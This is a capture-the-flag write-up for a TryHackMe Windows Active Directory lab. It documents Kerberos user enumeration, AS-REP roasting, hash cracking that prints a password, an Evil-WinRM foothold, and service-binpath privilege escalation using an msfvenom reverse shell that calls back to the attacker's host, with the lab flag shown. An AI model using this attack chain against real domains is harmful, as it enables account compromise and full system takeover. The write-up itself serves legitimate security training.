---
weight: 3
title: "TryHackMe CTF: Windows Services"
date: 2023-07-06T20:13:40+08:00
description: "This is a writeup of the CTF 'Services' on TryHackMe"

featuredImage: tryhackmebanner.jpg
hiddenfeaturedImage: false

tags: ["TryHackMe", "CTF", "Windows", "Kerberos", "Privilege Escalation"]
categories: ["Writeups"]

lightgallery: true
summary: This CTF room gives us a tase of some basic penetration testing, enumeration, privilege escalation and Windows host enumeration.
---

# Windows: Services

1. July 2023

An Active Directory, Windows machine where services and kerberos are being exploited.

Difficulty: Medium

![Untitled](/windows_services/Untitled.png)

# Summary

- Initial NMAP scan reveals a web service, LDAP and WinRM running on the host, which is a domain controller.
- Website recon and enumeration reveals some usernames
- 1 valid user account is revealed through AS-REP Roasting and Kerberos enumeration with Impacket
- The user account’s hash is cracked with John and Hashcat
- Evil-WinRM is used to get initial access
- Initial host OS and AD enumeration quickly reveals that the compromised user is a member of a privileged group and can manipulate running services
- Privilege escalation to Local Administrator is achieved through exploiting an elevated service’s execution path

# NMAP

We can see that the hostname of our target is WIN-SERVICES and the domain name is services.local.

Interesting services are Kerberos, LDAP, RDP, HTTP, SMB, DNS and WinRM.

Notice the username “administrator” is found with the nmap script “krb5-enum-users”.

The WinRM service is on port 5986 named “**http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)**”. 

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sV -sC -A -T5 $IP
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-06 10:52 EDT
Nmap scan report for 10.10.30.4
Host is up (0.042s latency).
Not shown: 987 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Above Services
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-07-06 14:52:40Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: services.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: services.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-07-06T14:52:50+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: SERVICES
|   NetBIOS_Domain_Name: SERVICES
|   NetBIOS_Computer_Name: WIN-SERVICES
|   DNS_Domain_Name: services.local
|   DNS_Computer_Name: WIN-SERVICES.services.local
|   Product_Version: 10.0.17763
|_  System_Time: 2023-07-06T14:52:42+00:00
| ssl-cert: Subject: commonName=WIN-SERVICES.services.local
| Not valid before: 2023-02-14T05:27:26
|_Not valid after:  2023-08-16T05:27:26
Service Info: Host: WIN-SERVICES; OS: Windows; CPE: cpe:/o:microsoft:windows
5985/tcp open   http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp closed wsmans
9389/tcp  open     mc-nmf        .NET Message Framing
46685/tcp filtered unknown
47001/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49395/tcp open     msrpc         Microsoft Windows RPC
49664/tcp open     msrpc         Microsoft Windows RPC
49665/tcp open     msrpc         Microsoft Windows RPC
49666/tcp open     msrpc         Microsoft Windows RPC
49667/tcp open     msrpc         Microsoft Windows RPC
49668/tcp open     msrpc         Microsoft Windows RPC
49670/tcp open     msrpc         Microsoft Windows RPC
49671/tcp open     ncacn_http    Microsoft Windows RPC over HTTP 1.0
49673/tcp open     msrpc         Microsoft Windows RPC
49674/tcp open     msrpc         Microsoft Windows RPC
49677/tcp open     msrpc         Microsoft Windows RPC
49694/tcp open     msrpc         Microsoft Windows RPC
49702/tcp open     msrpc         Microsoft Windows RPC
60170/tcp filtered unknown

Host script results:
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-time: 
|   date: 2023-07-06T14:52:44
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

┌──(kali㉿kali)-[~/activedirectory]
└─$ nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='services.local' $IP
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-06 11:28 EDT
Nmap scan report for 10.10.30.4
Host is up (0.051s latency).

PORT   STATE SERVICE
88/tcp open  kerberos-sec
| krb5-enum-users: 
| Discovered Kerberos principals
|_    **administrator@services.local**
```

# Username Enumeration

## Website

![Untitled](/windows_services/Untitled%201.png)

The username “j.doe” was an e-mail address scraped from the website on port 80 (j.doe@services.local). 

The naming convention fits the first and last name of the people under “Our Team” on the website.

**Joanne Doe = j.doe**

**Jack Rock = j.rock**

**Will Masters = w.masters**

**Johnny LaRusso = j.larusso**

## Kerbrute

With kerbrute we manage to find 4 valid usernames so far, going from the usernames we scraped from the website.

```bash
┌──(kali㉿kali)-[/usr/local/bin]
└─$ kerbrute userenum --dc $IP -d services.local ~/wordlists/Active-Directory-Wordlists/User.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 07/06/23 - Ronnie Flathers @ropnop

2023/07/06 12:13:37 >  Using KDC(s):
2023/07/06 12:13:37 >   10.10.30.4:88

2023/07/06 14:32:16 >  [+] VALID USERNAME:       **administrator@services.local**
2023/07/06 14:32:16 >  [+] VALID USERNAME:       **j.doe@services.local**
2023/07/06 14:32:16 >  [+] VALID USERNAME:       **j.larusso@services.local**
2023/07/06 14:32:16 >  [+] VALID USERNAME:       **w.masters@services.local**
2023/07/06 14:32:16 >  [+] VALID USERNAME:       **j.rock@services.local**
2023/07/06 12:13:37 >  Done! Tested 158 usernames (2 valid) in 0.660 seconds
```

# Attacking Kerberos

Very similar to Kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos **pre-authentication disabled**. Unlike Kerberoasting these users **do not have to be service accounts** the only requirement to be able to AS-REP roast a user is the user must have pre-authentication disabled.

Now that we have a small list with valid usernames, we can use AS-Rep roasting against the DC.

With an AS REP Roasting attack, we successfully get a hash for the user “**j.rock@services.local**”.

## LinWinPwn

We can automate this step with LinWinPwn.

![Untitled](/windows_services/Untitled%202.png)

## Impacket-GetNPUsers

We can also do it manually with GetNPUsers from the impacket suite.

`impacket-GetNPUsers services.local/ -user /home/kali/tryhackme/services/usernames.txt -format hashcat`

```bash
impacket-GetNPUsers services.local/ -user /home/kali/tryhackme/services/usernames.txt -format hashcat

$krb5asrep$23$j.rock@SERVICES.LOCAL:c4cf237723cb3a680a89d7db138ef4ad$2c32b8d635aa2d7ea01bf23c44a734d89f37cb346c1f230e71ccd317086d3867a87758ef9fa204d783b8d80fba1a758b5a7cf664a88a727ddcbca7b8831c3af71780f3e4c7bdf14da7a3f1171059488cd18985db3e63549ef8193c7b40f6eae8d23b5074f8fce31da5491ab35958c6459e38622714d62e7dc489da6407b8d8b78bb2088eed227c8e80412e8deba9a28c5533459d64a893fad789de79de8bfe476cbeb3b5baf2640ff237ab54beaf3dae2085bb26e9db9e9f57c9cfbedb68ec11276f882602fd006899cb562a5e15ac1b115edd6846eec63fc6aa08964034049920a4e042e1f9c9804ec3c12a278d159d
```

# Cracking the Kerberos hash

## Cracking the krb5 hash with John

We can crack the hash output from LinWinPwn with John The Ripper.

`john /home/kali/tryhackme/services/john_hash.txt && john --show /home/kali/tryhackme/services/john_hash.txt`

```bash
┌──(kali㉿kali)-[~/linWinPwn]
└─$ john /home/kali/tryhackme/services/john_hash.txt && john --show /home/kali/tryhackme/services/john_hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
No password hashes left to crack (see FAQ)
**j.rock@SERVICES.LOCAL:Serviceworks1

1 password hash cracked, 0 left**

[*] Cracking found hashes using john the ripper
[i] Using /usr/share/wordlists/rockyou.txt wordlist...
[*] Launching john on collected asreproast hashes. This may take a while...
[i] Press CTRL-C to abort john...
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 4 OpenMP threads
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
Serviceworks1    (j.rock@SERVICES.LOCAL)     
1g 0:00:00:08 DONE (2023-07-06 14:37) 0.1226g/s 1301Kp/s 1301Kc/s 1301KC/s SexieEyez1..Sergio03
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
[+] Printing cracked AS REP Roast hashes...
**j.rock@SERVICES.LOCAL:Serviceworks1**

1 password hash cracked, 0 left
```

## Cracking the krb5 hash with Hashcat

We can also crack and show the hash with Haschat.

`hashcat -m 18200 /home/kali/tryhackme/services/hashcat_hash.txt ~/wordlists/rockyou.txt --force --show`

```bash
hashcat -m 18200 /home/kali/tryhackme/services/hashcat_hash.txt ~/wordlists/rockyou.txt --force --show

┌──(kali㉿kali)-[~/linWinPwn]
└─$ hashcat --show /home/kali/tryhackme/services/hashcat_hash.txt                                           
Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

18200 | Kerberos 5, etype 23, AS-REP | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

$krb5asrep$23$j.rock@SERVICES.LOCAL:c4cf237723cb3a680a89d7db138ef4ad$2c32b8d635aa2d7ea01bf23c44a734d89f37cb346c1f230e71ccd317086d3867a87758ef9fa204d783b8d80fba1a758b5a7cf664a88a727ddcbca7b8831c3af71780f3e4c7bdf14da7a3f1171059488cd18985db3e63549ef8193c7b40f6eae8d23b5074f8fce31da5491ab35958c6459e38622714d62e7dc489da6407b8d8b78bb2088eed227c8e80412e8deba9a28c5533459d64a893fad789de79de8bfe476cbeb3b5baf2640ff237ab54beaf3dae2085bb26e9db9e9f57c9cfbedb68ec11276f882602fd006899cb562a5e15ac1b115edd6846eec63fc6aa08964034049920a4e042e1f9c9804ec3c12a278d159d:Serviceworks1
```

# User Enumeration continued

## CrackMapExec

With these credentials, we use “RID bruteforcing” with CME to see if there are any other users that we have not found yet. 

We also found some shares that are readable and writeable.

`crackmapexec smb $IP -u 'j.rock' -p 'Serviceworks1' --rid-brute | grep SidTypeUser`

```bash
└─$ crackmapexec smb $IP -u 'j.rock' -p 'Serviceworks1' --rid-brute | grep SidTypeUser
SMB         10.10.30.4      445    WIN-SERVICES     500: SERVICES\Administrator (SidTypeUser)
SMB         10.10.30.4      445    WIN-SERVICES     501: SERVICES\Guest (SidTypeUser)
SMB         10.10.30.4      445    WIN-SERVICES     502: SERVICES\krbtgt (SidTypeUser)
SMB         10.10.30.4      445    WIN-SERVICES     1008: SERVICES\WIN-SERVICES$ (SidTypeUser)
SMB         10.10.30.4      445    WIN-SERVICES     1111: SERVICES\j.rock (SidTypeUser)
SMB         10.10.30.4      445    WIN-SERVICES     1112: SERVICES\j.doe (SidTypeUser)
SMB         10.10.30.4      445    WIN-SERVICES     1113: SERVICES\w.masters (SidTypeUser)
SMB         10.10.30.4      445    WIN-SERVICES     1114: SERVICES\j.larusso (SidTypeUser)
```

`crackmapexec smb 10.10.30.4 -u j.rock -p 'Serviceworks1' --shares`

![Untitled](/windows_services/Untitled%203.png)

# Initial Access

We use Evil-WinRM to get a shell on the machine with the credentials we found earlier.

`evil-winrm -i $IP -u j.rock -e '/home/kali/tryhackme/services'` 

```bash
┌──(kali㉿kali)-[~/tryhackme/services]
└─$ evil-winrm -i $IP -u j.rock -e '/home/kali/tryhackme/services'                                            
Enter Password: 

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\j.rock\Documents>
```

# AD and Host Enumeration

### Initial enumeration commands

With the shell connection established, we quickly enumerate our host and environment.

Notice that we are a member of the group “Server Operators”. According to the MS wiki, we can do lots of admin tasks with this group.

<aside>
💡 What is server operators group?
Server Operators. A built-in group that exists only on domain controllers. By default, the group has no members. Server Operators can log on to a server interactively; create and delete network shares; start and stop services; back up and restore files; format the hard disk of the computer; and shut down the computer.

</aside>

We also find the first flag in C:\Users\j.rock\Desktop\user.txt

![Untitled](/windows_services/Untitled%204.png)

### Enumerating running services

Evil-WinRM has a built in function to enumerate running services.

After attempting to configure the binpath of the services with Privileges set to “True”, we find out that we have access to modify some of the services. 

This can be abused by setting a custom binary path and restart services.

`sc.exe config servicename binpath="C:\Temp\xx.exe"`

```powershell
*Evil-WinRM* PS C:\Users\j.rock\Documents> services

Path                                                                           Privileges Service          
----                                                                           ---------- -------          
C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                            True ADWS             
"C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe"                                   True AmazonSSMAgent   
"C:\Program Files\Amazon\XenTools\LiteAgent.exe"                                     True AWSLiteAgent     
"C:\Program Files\Amazon\cfn-bootstrap\winhup.exe"                                   True cfn-hup          
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                        True NetTcpPortSharing
C:\Windows\SysWow64\perfhost.exe                                                     True PerfHost         
"C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"          False Sense            
C:\Windows\servicing\TrustedInstaller.exe                                           False TrustedInstaller 
"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2302.7-0\NisSrv.exe"        True WdNisSvc         
"C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2302.7-0\MsMpEng.exe"       True WinDefend        
"C:\Program Files\Windows Media Player\wmpnetwk.exe"                                False WMPNetworkSvc
```

# Privilege Escalation

With the built-in menu function in Evil-WinRM we saw some interesting services that are available to us with Set Privileges “True”.

Since our user is a member of the group “Server Operators”, we can stop and start services AND set the PATH of execution. 

That way, we can load a crafted malicious binary.

### Creating the payload

We craft a simple reverse shell payload and upload it through our Evil-WinRM shell session.

`msfvenom -p -p windows/shell_reverse_tcp LHOST=10.11.7.243 LPORT=9000 -f exe -o reverse.exe`

```bash
┌──(kali㉿kali)-[~/tryhackme/services]
└─$ msfvenom -p -p windows/shell_reverse_tcp LHOST=10.11.7.243 LPORT=9000 -f exe -o reverse.exe

##############################

*Evil-WinRM* PS C:\Users\j.rock\Downloads> upload reverse.exe
Info: Uploading meterp.exe to C:\Users\j.rock\Downloads\reverse.exe

                                                             
Data: 276480 bytes of 276480 bytes copied

Info: Upload successful!                                                          
```

### Starting the service with modified PATH

`sc.exe config cfn-hup binpath="C:\Users\j.rock\Downloads\reverse.exe”`

`sc.exe start cfn-hup`

```bash
*Evil-WinRM* PS C:\Users\j.rock\Downloads> sc.exe config cfn-hup binpath="C:\Users\j.rock\Downloads\reverse.exe"
[SC] ChangeServiceConfig SUCCESS
```

### Netcat

We start our NetCat listener on the kali machine and get an elevated shell.

We are now “**nt authority\system**” and can read the last flag.

`nc -lvnp 9000`

```bash
┌──(kali㉿kali)-[~/tryhackme/services]
└─$ nc -lvnp 9000                 
listening on [any] 9000 ...
connect to [10.11.7.243] from (UNKNOWN) [10.10.233.162] 53601
Microsoft Windows [Version 10.0.17763.4010]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
type C:\Users\Administrator\Desktop\root.txt
THM{S3rv3r_0p3rat0rS}
```